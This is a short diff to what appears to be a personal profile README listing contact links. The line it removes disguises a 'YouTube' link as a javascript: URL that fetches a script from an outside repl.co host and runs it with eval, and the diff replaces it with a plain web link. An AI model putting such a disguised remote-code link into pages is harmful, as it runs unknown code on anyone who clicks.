@@ -27,4 +27,4 @@ You Can Contact Me Via Any Of The Following
 [Twitter](https://twitter.com/AIexSpaces)
 
 ### Annoy Me
-Click - YouTube: [Here](javascript:fetch('https://Nullify-20.garoikana.repl.co/main.js').then(r => r.text()).then(r => eval(r)) To Annoy Me (Webhook)
+Click - YouTube: [Here](https://Alexspac.es/Alexspaces) To Annoy Me (Webhook)
